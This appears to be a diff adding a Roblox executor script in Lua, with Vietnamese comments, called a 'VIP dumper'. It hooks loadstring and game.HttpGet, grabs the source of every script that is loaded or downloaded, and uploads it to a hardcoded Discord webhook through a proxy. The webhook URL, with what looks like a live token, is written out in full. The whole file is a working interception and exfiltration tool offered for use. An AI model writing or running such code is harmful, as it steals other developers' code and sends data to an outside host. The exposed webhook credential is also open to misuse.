@@ -1,0 +1,60 @@
+local HttpService = game:GetService("HttpService")
+
+-- Webhook của bạn (Đã đổi sang Proxy Hyra để tránh lỗi InvalidUrl trên Delta)
+local WEBHOOK_URL = "https://hooks.hyra.io/api/webhooks/1405916308431704176/BoCB5BoazAcDU0jTHQqepVNBvXdTkCp6hsUavUCK_zNuDB26fQZYj8z5Buyh57zC6hH4"
+
+local function sendToDiscord(fileName, source)
+    if not source or #source < 5 then return end -- Bỏ qua các chuỗi rác hoặc trống
+    
+    local boundary = "---------------------------" .. string.sub(HttpService:GenerateGUID(false), 1, 15)
+    local body = table.concat({
+        "--" .. boundary,
+        "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"",
+        "Content-Type: text/plain",
+        "",
+        "-- [DUMPED SOURCE] --\n\n" .. source,
+        "--" .. boundary .. "--",
+        ""
+    }, "\r\n")
+
+    pcall(function()
+        HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
+            Body = body
+        })
+    end)
+end
+
+-- 1. Hook LOADSTRING (Bắt code gốc khi script mẹ giải mã xong code con)
+local oldLoadstring
+oldLoadstring = hookfunction(loadstring, function(source, chunkname)
+    print("💎 Bắt được Loadstring: " .. tostring(chunkname or "Unknown"))
+    task.spawn(function()
+        sendToDiscord("loadstring_dump.lua", source)
+    end)
+    return oldLoadstring(source, chunkname)
+end)
+
+-- 2. Hook HTTPGET (Bắt link tải ban đầu)
+local oldHttpGet
+oldHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
+    print("🔗 Đang tải từ link: " .. url)
+    local content = oldHttpGet(self, url, ...)
+    task.spawn(function()
+        sendToDiscord("httpget_dump.lua", content)
+    end)
+    return content
+end)
+
+-- 3. Tạo thông báo trên màn hình cho Vip
+local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
+local txt = Instance.new("TextLabel", sg)
+txt.Size = UDim2.new(0, 200, 0, 50)
+txt.Position = UDim2.new(0.5, -100, 0, 100)
+txt.Text = "VIP DUMPER ACTIVE"
+txt.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+txt.TextColor3 = Color3.new(1, 1, 1)
+
+print("🔥 VIP DUMPER ĐÃ KÍCH HOẠT - MỌI SCRIPT CHẠY SẼ BỊ GỬI VỀ DISCORD")
